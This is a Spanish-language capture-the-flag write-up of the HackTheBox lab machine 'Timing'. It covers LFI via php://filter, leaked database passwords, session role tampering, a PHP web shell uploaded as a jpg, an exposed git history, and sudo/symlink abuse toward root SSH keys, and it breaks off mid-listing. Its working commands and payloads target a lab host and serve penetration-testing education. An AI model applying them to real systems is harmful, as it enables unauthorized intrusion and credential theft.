---
layout: post
title: Timing - WriteUp
author: WildZarek
permalink: /htb/timing
excerpt: "Máquina Linux de dificultad media, en la que nos aprovecharemos de la vulnerabilidad LFI para leer archivos del sistema y crearemos nuestro propio script autopwn con python. Finalmente abusaremos de un binario .jar para escalar privilegios."
description: "Máquina Linux de dificultad media, en la que nos aprovecharemos de la vulnerabilidad LFI para leer archivos del sistema y crearemos nuestro propio script autopwn con python. Finalmente abusaremos de un binario .jar para escalar privilegios."
date: 2022-06-04
header:
  teaser: /assets/images/hackthebox/machines/timing.png
  teaser_home_page: true
  icon: /assets/images/hackthebox/htb_icon_original.png
categories: [HackTheBox, Pentesting, Web Exploiting, Privilege Escalation]
tags: [LFI, RCE, SOURCE CODE REVIEW, GIT, JAR FILE]
---

<p align="center"><img src="/assets/images/hackthebox/machines/timing.png"></p>

## Fecha de Resolución

<a href="https://www.hackthebox.com/achievement/machine/18979/421">
  <img src="/assets/images/hackthebox/machines/timing/pwned_date.png">
</a>

## Fase de Reconocimiento

Empezamos con el reconocimiento de puertos lanzando un **`TCP SYN Port Scan`**

| Parámetro  | Descripción |
| :--------- | :---------- |
| -p-        | Escanea el rango completo de puertos (hasta el 65535) |
| -sS        | Realiza un escaneo de tipo SYN port scan              |
| --min-rate | Enviar paquetes no más lentos que 5000 por segundo    |
| --open     | Mostrar sólo los puertos que esten abiertos           |
| -vvv       | Triple verbose para ver en consola los resultados     |
| -n         | No efectuar resolución DNS                            |
| -Pn        | No efectuar descubrimiento de hosts                   |
| -oG        | Guarda el output en un archivo con formato grepeable para usar la función [extractPorts](https://pastebin.com/tYpwpauW) de [S4vitar](https://s4vitar.github.io/)

```console
p3ntest1ng:~$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.135 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 00:37 CET
Initiating SYN Stealth Scan at 00:37
Scanning 10.10.11.135 [65535 ports]
Discovered open port 22/tcp on 10.10.11.135
Discovered open port 80/tcp on 10.10.11.135
Completed SYN Stealth Scan at 00:37, 9.53s elapsed (65535 total ports)
Nmap scan report for 10.10.11.135
Host is up, received user-set (0.097s latency).
Scanned at 2022-02-26 00:37:06 CET for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
           Raw packets sent: 65566 (2.885MB) | Rcvd: 65555 (2.622MB)
```

Identificamos los siguientes puertos abiertos:

| Puerto | Descripción |
| :----- | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)** - SSH o Secure Shell |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Servidor_web)** - Servidor web      |

Vamos a obtener más información con un escaneo específico sobre los puertos que hemos encontrado.

| Parámetro | Descripción |
| :-------- | :---------- |
| -p        | Escanea sobre los puertos especificados                |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Determina la versión del servicio                      |
| -oN       | Guarda el output en un archivo con formato normal      |

```console
p3ntest1ng:~$ nmap -sCV -p 22,80 10.10.11.135 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 00:43 CET
Nmap scan report for 10.10.11.135
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
```

Veamos con qué está desarrollada la página web utilizando la herramienta **`whatweb`**

```console
p3ntest1ng:~$ whatweb http://10.10.11.135/
http://10.10.11.135/ [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], RedirectLocation[./login.php]
http://10.10.11.135/login.php [200 OK] Apache[2.4.29], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[#,dkstudioin@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.135], JQuery, Script, Title[Simple WebApp]
```

Asignamos un "dominio" a la máquina en nuestro archivo **`/etc/hosts`** por si se está aplicando virtualhosting.

```console
p3ntest1ng:~$ echo '10.10.11.135 timing.htb' | sudo tee -a /etc/hosts
```

He buscado directorios y subdominios, pero no he encontrado nada interesante. Revisemos la página para ver qué tenemos.

![Website](/assets/images/hackthebox/machines/timing/website.png)

Anteriormente ya vimos con whatweb que se aplicaba un redirect hacia **`login.php`**, podemos ver si existen más archivos de este tipo.

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 --hh 275 http://timing.htb/FUZZ.php 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://timing.htb/FUZZ.php
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000001652:   200        115 L    264 W      3933 Ch     "footer"                                                                                                                    
000001877:   302        0 L      0 W        0 Ch        "header"                                                                                                                    
000001985:   200        0 L      0 W        0 Ch        "image"                                                                                                                     
000002017:   302        0 L      0 W        0 Ch        "index"                                                                                                                     
000002362:   302        0 L      0 W        0 Ch        "logout"                                                                                                                    
000002347:   200        177 L    374 W      5605 Ch     "login"                                                                                                                     
000003160:   302        0 L      0 W        0 Ch        "profile"                                                                                                                   
000004207:   302        0 L      0 W        0 Ch        "upload"                                                                                                                    

Total time: 0
Processed Requests: 4614
Filtered Requests: 4606
Requests/sec.: 0
```

Vemos que existen varios archivos con este formato, y que la mayoría tienen un redirect como vimos anteriormente.
Tenemos presente un archivo **`upload.php`** que puede ser interesante, pero no tenemos acceso debido al redirect.

Podemos ver el archivo **`image.php`** que si accedemos a él desde el navegador, nos devuelve un html vacío.
Esto puede deberse a que sea el encargado de mostrar el contenido de otros archivos,
para lo cual podemos pensar en que existe algún parámetro definido, dando lugar a un [Local File Inclusion (LFI)](https://ironhackers.es/herramientas/lfi-cheat-sheet/)

Vamos a comprobar esto con wfuzz:

```console
p3ntest1ng:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hh 0 -u "http://timing.htb/image.php?FUZZ=/etc/passwd" -t 50 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://timing.htb/image.php?FUZZ=/etc/passwd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000360:   200        0 L      3 W        25 Ch       "img"                                                                                                                       

Total time: 0
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 0
```

## Fase de Explotación

Teniendo este parámetro vulnerable a **`LFI`**, podemos intentar listar algún archivo del sistema y ver el resultado.

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=/etc/passwd"
Hacking attempt detected!
```

A pesar de ser vulnerable, nos muestra un mensaje de alerta pero no el contenido del archivo,
para poder solventar este inconveniente podemos utilizar el filtro base64 de php, esto lo haremos de la siguiente forma:

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-decoder/resource=/etc/passwd" | grep -vE "nologin|false|sync"
root:x:0:0:root:/root:/bin/bash
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

Perfecto, gracias a este wrapper de php hemos sido capaces de leer el contenido de un archivo local, vamos a ver cómo aprovecharnos de esto.
En primer lugar podemos ver el código del archivo **`login.php`** y de este modo verificar si existen contraseñas
hardcodeadas en el código fuente que nos permita ingresar en la web o el sistema. Para ello usaré un filtro php de conversión a base64.

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=login.php" | base64 -d
<?php

include "header.php";

function createTimeChannel()
{
    sleep(1);
}

include "db_conn.php";

if (isset($_SESSION['userid'])){
    header('Location: ./index.php');
    die();
}


if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";


}
?>
...[snip]...
```

En este fragmento de código vemos que se importa otro archivo php de nombre **`db_conn`**, que posiblemente contenga la contraseña de acceso a la base de datos.

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php" | base64 -d
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Con esta información podemos probar si existe reutilización de contraseñas con alguno de los usuarios que encontramos en el **`/etc/passwd`**

```console
p3ntest1ng:~$ ssh aaron@timing.htb
The authenticity of host 'timing.htb (10.10.11.135)' can't be established.
ECDSA key fingerprint is SHA256:w5P4pFdNqpvCcxxisM5OCJz7a6chyDUrd1JQ14k5smY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'timing.htb,10.10.11.135' (ECDSA) to the list of known hosts.
aaron@timing.htb's password: 4_V3Ry_l0000n9_p422w0rd
Permission denied, please try again.
```

Tampoco tenemos suerte con esto, podemos leer el archivo upload.php para ver cómo está construido.

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php" | base64 -d
```

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

Lo más importante es que vemos que se hace inclusión de otro archivo php al que podemos echarle un ojo:

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php" | base64 -d
```

```php
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
```

Aquí vemos que se está comprobando que si nuestra sesión no equivale a 1, entonces nos redirige automáticamente al **`index.php`**
Podemos seguir analizando archivos php, vamos a revisar el **`profile.php`** para ver qué tiene.

```php
<?php
include_once "header.php";

include_once "db_conn.php";

$id = $_SESSION['userid'];


// fetch updated user
$statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$result = $statement->execute(array('id' => $id));
$user = $statement->fetch();


?>

<script src="js/profile.js"></script>
...[snip]...
```

Aquí lo interesante es que existe un **`profile.js`** que parece encargarse de actualizar nuestro perfil. Veamos el código.

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=js/profile.js" | base64 -d
function updateProfile() {
    var xml = new XMLHttpRequest();
    xml.onreadystatechange = function () {
        if (xml.readyState == 4 && xml.status == 200) {
            document.getElementById("alert-profile-update").style.display = "block"
        }
    };

    xml.open("POST", "profile_update.php", true);
    xml.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xml.send("firstName=" + document.getElementById("firstName").value + "&lastName=" + document.getElementById("lastName").value + "&email=" + document.getElementById("email").value + "&company=" + document.getElementById("company").value);
}
```

De nuevo encontramos otro archivo php, echemos un vistazo a **`profile_update.php`**

```console
p3ntest1ng:~$ curl -s -X GET "http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=profile_update.php" | base64 -d
```

```php
<?php

include "auth_check.php";

$error = "";

if (empty($_POST['firstName'])) {
    $error = 'First Name is required.';
} else if (empty($_POST['lastName'])) {
    $error = 'Last Name is required.';
} else if (empty($_POST['email'])) {
    $error = 'Email is required.';
} else if (empty($_POST['company'])) {
    $error = 'Company is required.';
}

if (!empty($error)) {
    die("Error updating profile, reason: " . $error);
} else {

    include "db_conn.php";

    $id = $_SESSION['userid'];
    $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $result = $statement->execute(array('id' => $id));
    $user = $statement->fetch();

    if ($user !== false) {

        ini_set('display_errors', '1');
        ini_set('display_startup_errors', '1');
        error_reporting(E_ALL);

        $firstName = $_POST['firstName'];
        $lastName = $_POST['lastName'];
        $email = $_POST['email'];
        $company = $_POST['company'];
        $role = $user['role'];

        if (isset($_POST['role'])) {
            $role = $_POST['role'];
            $_SESSION['role'] = $role;
        }


        // dont persist role
        $sql = "UPDATE users SET firstName='$firstName', lastName='$lastName', email='$email', company='$company' WHERE id=$id";

        $stmt = $pdo->prepare($sql);
        $stmt->execute();

        $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
        $result = $statement->execute(array('id' => $id));
        $user = $statement->fetch();

        // but return it to avoid confusion
        $user['role'] = $role;
        $user['6'] = $role;

        echo json_encode($user, JSON_PRETTY_PRINT);

    } else {
        echo "No user with this id was found.";
    }

}

?>
```

En este punto, sabemos que existe un usuario **`aaron`** y que para ver el sitio tenemos que tener establecido el atributo **`role`** a 1 en la sesión,
volvamos a la página para tratar de iniciar sesión con este usuario.

![Login](/assets/images/hackthebox/machines/timing/login.png)

En esta ocasión tenemos suerte de que la contraseña sea la misma que el usuario...

![Logged](/assets/images/hackthebox/machines/timing/logged.png)

Estando logueados vemos que podemos editar nuestro perfil, vamos a ver qué podemos modificar.

![EditProfile](/assets/images/hackthebox/machines/timing/edit.png)

Vamos a capturar esta petición con **`Burpsuite`** para ver cómo se envían los datos y manipular la petición.

![BurpSuite](/assets/images/hackthebox/machines/timing/burpsuite.png)

Enviamos la petición modificada...

![Success](/assets/images/hackthebox/machines/timing/success.png)

Refrescamos la página y nos aparece un nuevo enlace que nos lleva al panel de administrador, que básicamente es el uploader.

![AdminPanel](/assets/images/hackthebox/machines/timing/adminpanel.png)

![Uploader](/assets/images/hackthebox/machines/timing/uploader.png)

Como vimos anteriormente en el código del **`upload.php`**, el archivo que podemos subir es un **`jpg`** y al nombre del archivo se le
agrega un hash MD5 basado en tiempo, esto lo podemos ver en este fragmento de código:

```php
$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
```

Sin embargo aquí hay un problema, al estar utilizando comillas simples, la variable $file_hash no se va a interpretar, 
por lo tanto el MD5 será sobre el string **`$file_hash`** literalmente.

Vamos a crear un archivo con código php pero vamos a cambiar la extensión a jpg para poder subirlo.

```console
p3ntest1ng:~$ vi pwned.jpg
<?php system($_GET[pwn]);?>
```

Sabiendo toda esta información, podemos crear un script en python que nos automatice todo el proceso anterior,
además de la subida del archivo de forma que sólo tengamos que ejecutarlo para obtener una pseudo-shell y ejecutar comandos en el sistema.

Os dejo el enlace al script [AutoPwn_Timing.py](https://github.com/WildZarek/wildzarek.github.io/blob/master/scripts/python/autopwn_timing.py)

![Autopwn](/assets/images/hackthebox/machines/timing/autopwn.png)

Lo ideal ahora sería entablar una conexión inversa a nuestra máquina que nos otorgue una shell completa, ya que estamos operando sobre una webshell.
Pero como vemos en la captura anterior, esto no es posible dado que no tenemos permisos para ejecutar **`bash`** o **`nc`**

Algo que podemos hacer es tratar de listar algunos archivos que pueda haber en el sistema, para ahorraros tiempo, vamos a listar todos los archivos **`zip`**

```console
~$ find / -type f -iname *.zip 2>/dev/null
/opt/source-files-backup.zip
```

Encontramos un archivo backup, por lo tanto vamos a tratar de copiarlo a un directorio accesible, por ejemplo dentro de **`/var/www/html`** que es la ruta donde está corriendo la web.

```console
~$ cp /opt/source-files-backup.zip .
```

Ahora podemos descargar este archivo en nuestra máquina con **`wget`**

```console
p3ntest1ng:~$ wget http://timing.htb/source-files-backup.zip
--2022-05-23 01:55:27--  http://timing.htb/source-files-backup.zip
Resolviendo timing.htb (timing.htb)... 10.10.11.135
Conectando con timing.htb (timing.htb)[10.10.11.135]:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 627851 (613K) [application/zip]
Grabando a: «source-files-backup.zip»

source-files-backup.zip     100%[===================>] 613,14K   721KB/s    en 0,9s    

2022-05-23 01:55:29 (721 KB/s) - «source-files-backup.zip» guardado [627851/627851]
p3ntest1ng:~$ md5sum source-files-backup.zip
7fd8d13ab49b661b4d484f809a217810  source-files-backup.zip
```

Comprobemos el hash MD5 del archivo con el del servidor para verificar que se haya descargado correctamente:

```console
~$ md5sum source-files-backup.zip
7fd8d13ab49b661b4d484f809a217810  source-files-backup.zip
```

Perfecto, el archivo es idéntico al que existe en el servidor. Vamos a descomprimirlo para ver qué tiene dentro.

```console
p3ntest1ng:~$ 7z x source-files-backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Celeron(R) N4020 CPU @ 1.10GHz (706A8),ASM,AES-NI)

Scanning the drive for archives:
1 file, 627851 bytes (614 KiB)

Extracting archive: source-files-backup.zip
--
Path = source-files-backup.zip
Type = zip
Physical Size = 627851

Everything is Ok                              

Folders: 46
Files: 70
Size:       848116
Compressed: 627851
```

Listemos el contenido de todo el directorio:

```console
p3ntest1ng:~$ tree -fas
.
├── [        200]  ./admin_auth_check.php
├── [        373]  ./auth_check.php
├── [       1268]  ./avatar_uploader.php
├── [          0]  ./css
│   ├── [     121457]  ./css/bootstrap.min.css
│   └── [       5425]  ./css/login.css
├── [         92]  ./db_conn.php
├── [       3937]  ./footer.php
├── [       4096]  ./.git
│   ├── [          0]  ./.git/branches
│   ├── [         16]  ./.git/COMMIT_EDITMSG
│   ├── [         92]  ./.git/config
│   ├── [         73]  ./.git/description
│   ├── [         23]  ./.git/HEAD
│   ├── [       4096]  ./.git/hooks
│   │   ├── [        478]  ./.git/hooks/applypatch-msg.sample
│   │   ├── [        896]  ./.git/hooks/commit-msg.sample
│   │   ├── [       3327]  ./.git/hooks/fsmonitor-watchman.sample
│   │   ├── [        189]  ./.git/hooks/post-update.sample
│   │   ├── [        424]  ./.git/hooks/pre-applypatch.sample
│   │   ├── [       1642]  ./.git/hooks/pre-commit.sample
│   │   ├── [       1492]  ./.git/hooks/prepare-commit-msg.sample
│   │   ├── [       1348]  ./.git/hooks/pre-push.sample
│   │   ├── [       4898]  ./.git/hooks/pre-rebase.sample
│   │   ├── [        544]  ./.git/hooks/pre-receive.sample
│   │   └── [       3610]  ./.git/hooks/update.sample
│   ├── [       1872]  ./.git/index
│   ├── [          0]  ./.git/info
│   │   └── [        240]  ./.git/info/exclude
│   ├── [          0]  ./.git/logs
│   │   ├── [        305]  ./.git/logs/HEAD
│   │   └── [          0]  ./.git/logs/refs
│   │       └── [          0]  ./.git/logs/refs/heads
│   │           └── [        305]  ./.git/logs/refs/heads/master
│   ├── [       4096]  ./.git/objects
│   │   ├── [          0]  ./.git/objects/0f
│   │   │   └── [       1315]  ./.git/objects/0f/8a8564c67a0c18ced9f8e28f69e1c2191a2bb3
│   │   ├── [          0]  ./.git/objects/16
│   │   │   └── [        159]  ./.git/objects/16/de2698b5b122c93461298eab730d00273bd83e
│   │   ├── [          0]  ./.git/objects/1b
│   │   │   └── [        174]  ./.git/objects/1b/edfa65866f8fec84ae6e0e63e439b8d798114b
│   │   ├── [          0]  ./.git/objects/1f
│   │   │   └── [         90]  ./.git/objects/1f/457949f1dd206bad3e80428ad470860a516e63
│   │   ├── [          0]  ./.git/objects/3a
│   │   │   └── [         97]  ./.git/objects/3a/98be88c7b38b13b7f37db2c899a4b19e030772
│   │   ├── [          0]  ./.git/objects/3b
│   │   │   └── [        289]  ./.git/objects/3b/c107cb179fdd8d51cc7ca145cc1552b1238e67
│   │   ├── [          0]  ./.git/objects/3f
│   │   │   └── [        508]  ./.git/objects/3f/1ff21fefc9a2617c7156ad1b2e57ecab743410
│   │   ├── [          0]  ./.git/objects/53
│   │   │   └── [        102]  ./.git/objects/53/97ffa3fba95f07ddb5429457549fb468c8d710
│   │   ├── [          0]  ./.git/objects/5b
│   │   │   └── [      25224]  ./.git/objects/5b/96335ff6a02021199d731eaa19ccadd1dc8af8
│   │   ├── [          0]  ./.git/objects/6f
│   │   │   └── [        648]  ./.git/objects/6f/e7b341f6774596b25dd18bbd3663c662a59885
│   │   ├── [          0]  ./.git/objects/84
│   │   │   └── [        593]  ./.git/objects/84/89c4f1c46d63a7fda71e496af68e0d2c2f96dc
│   │   ├── [          0]  ./.git/objects/89
│   │   │   └── [        115]  ./.git/objects/89/916b91f1c5154b3aeb1327a6934c19da1ff655
│   │   ├── [          0]  ./.git/objects/8c
│   │   │   └── [        924]  ./.git/objects/8c/47c87fa49b159a46090ce5dd118f09c21e5b7d
│   │   ├── [          0]  ./.git/objects/8d
│   │   │   └── [        713]  ./.git/objects/8d/becc6f5310e51f8fef910b31f51eff1f241cd3
│   │   ├── [          0]  ./.git/objects/93
│   │   │   └── [     182138]  ./.git/objects/93/a21bd2695c99e0f88b0a8edbf187a774029a91
│   │   ├── [          0]  ./.git/objects/94
│   │   │   └── [       1446]  ./.git/objects/94/b0cf6a9ad8e727b64f14b5a642650b83228eba
│   │   ├── [          0]  ./.git/objects/b0
│   │   │   ├── [      36068]  ./.git/objects/b0/614034ad3a95e4ae9f53c2b015eeb3e8d68bde
│   │   │   └── [        555]  ./.git/objects/b0/b06798ca41889f827e4d4a5e54b7c54196171b
│   │   ├── [          0]  ./.git/objects/b4
│   │   │   └── [        270]  ./.git/objects/b4/e1ab3aa01c3f421f5c425e4800e6fc526ef000
│   │   ├── [          0]  ./.git/objects/c1
│   │   │   └── [        333]  ./.git/objects/c1/00fe9eccd7aca0340af22928b059d1b61c8d78
│   │   ├── [          0]  ./.git/objects/c6
│   │   │   └── [        161]  ./.git/objects/c6/ec0e2e0274eecbcb4ed8f4c9c8a87e28277c4a
│   │   ├── [          0]  ./.git/objects/dc
│   │   │   └── [        507]  ./.git/objects/dc/bc181650833009145874df7da85b4c6d84b2ca
│   │   ├── [          0]  ./.git/objects/e3
│   │   │   └── [      37471]  ./.git/objects/e3/d8b7a902e4dbdf6c29bff6d09dde7ed91b89e3
│   │   ├── [          0]  ./.git/objects/e4
│   │   │   └── [        123]  ./.git/objects/e4/e214696159a25c69812571c8214d2bf8736a3f
│   │   ├── [          0]  ./.git/objects/eb
│   │   │   └── [      13274]  ./.git/objects/eb/0a8b410f59eb8abcd21e588f1a7b718db3eebd
│   │   ├── [          0]  ./.git/objects/ee
│   │   │   └── [        871]  ./.git/objects/ee/6ea8f102ea1c5539ee346a2d5ced5c9beda66a
│   │   ├── [          0]  ./.git/objects/f1
│   │   │   └── [        107]  ./.git/objects/f1/c921713053704b60c55f07c88f76c879f3fc6c
│   │   ├── [          0]  ./.git/objects/f9
│   │   │   └── [        166]  ./.git/objects/f9/e070df890eec2f1733239c9208734e2a685f0c
│   │   ├── [          0]  ./.git/objects/fd
│   │   │   └── [        507]  ./.git/objects/fd/7fb62599f9702baeb0abdc42a8a4b68e49ec23
│   │   ├── [          0]  ./.git/objects/info
│   │   └── [          0]  ./.git/objects/pack
│   └── [          0]  ./.git/refs
│       ├── [          0]  ./.git/refs/heads
│       │   └── [         41]  ./.git/refs/heads/master
│       └── [          0]  ./.git/refs/tags
├── [       1498]  ./header.php
├── [        507]  ./image.php
├── [          0]  ./images
│   ├── [     208312]  ./images/background.jpg
│   ├── [          0]  ./images/uploads
│   └── [      38616]  ./images/user-icon.png
├── [        188]  ./index.php
├── [       4096]  ./js
│   ├── [       1735]  ./js/avatar_uploader.js
│   ├── [      39680]  ./js/bootstrap.min.js
│   ├── [      89476]  ./js/jquery.min.js
│   └── [        637]  ./js/profile.js
├── [       2074]  ./login.php
├── [        113]  ./logout.php
├── [       3041]  ./profile.php
├── [       1740]  ./profile_update.php
└── [        984]  ./upload.php

45 directories, 70 files
```

Existe un directorio **`.git`** por lo que vamos a proceder a revisarlo.

```console
p3ntest1ng:~$ git log
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

    init
```

Vemos que al parecer se ha modificado el archivo **`db_conn.php`**, comprobemos esto.

```console
p3ntest1ng:~$ git log -p -2
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

    init
...[snip]...
```

¡Bingo!, pues efectivamente se modificó el archivo **`db_conn.php`** para cambiar la contraseña **`S3cr3t_unGu3ss4bl3_p422w0Rd`** por **`4_V3Ry_l0000n9_p422w0rd`** (esta la habíamos obtenido anteriormente analizando el archivo db_conn.php en producción).
En este punto, se me ocurre intentar utilizar esta contraseña para acceder por SSH, pues es probable que haya reutilización de la misma.

```console
p3ntest1ng:~$ sshpass -p "S3cr3t_unGu3ss4bl3_p422w0Rd" ssh aaron@timing.htb
...[snip]...
aaron@timing:~$ ls
user.txt
aaron@timing:~$ cat user.txt 
0107329a9b3fd591ce43ff7fb9f84742
```

## Escalada de Privilegios

Comprobemos los permisos a nivel de sudo para el usuario **`aaron`**:

```console
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```	

Vemos que tenemos permisos de ejecución sobre un script, miremos a ver qué contiene:

```console
aaron@timing:~$ cat /usr/bin/netutils
#! /bin/bash
java -jar /root/netutils.jar
```

Lo ejecutamos para ver qué nos permite hacer este recurso:

```console
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: 
```

Nos pide una URL así que vamos a levantar un servidor web con python en nuestra máquina, pero primero creamos un archivo **`test.txt`** y luego pasaremos la url de nuestro archivo al binario **`netutils`**

```console
p3ntest1ng:~$ echo "this is a test" > test.txt
p3ntest1ng:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```console
...[snip]...
Enter Url: http://10.10.16.40/test.txt
Initializing download: http://10.10.16.40/test.txt
File size: 15 bytes
Opening output file test.txt
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 15 byte in 0 seconds. (0.04 KB/s)

netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 2
aaron@timing:~$ ls -la
...[snip]...
-rw-r--r-- 1 root  root    15 May 23 00:29 test.txt
-rw-r----- 1 root  aaron   33 May 22 21:01 user.txt
```

Lo que ha hecho el binario es descargar nuestro archivo, y como vemos en el output, el propietario es root...

Por lo tanto, algo que se me ocurre es tratar de inyectar una clave pública SSH en el **`authorized_keys`** del usuario **`root`**.
Para ello lo primero que podemos hacer es crear un enlace simbólico a este recurso:

```console
aaron@timing:~$ ln -s /root/.ssh/authorized_keys wild
aaron@timing:~$ ls -la
total 36
drwxr-x--x 5 aaron aaron 4096 Apr  8 15:20 .
drwxr-xr-x 3 root  root  4096 Dec  2 09:55 ..
lrwxrwxrwx 1 root  root     9 Oct  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
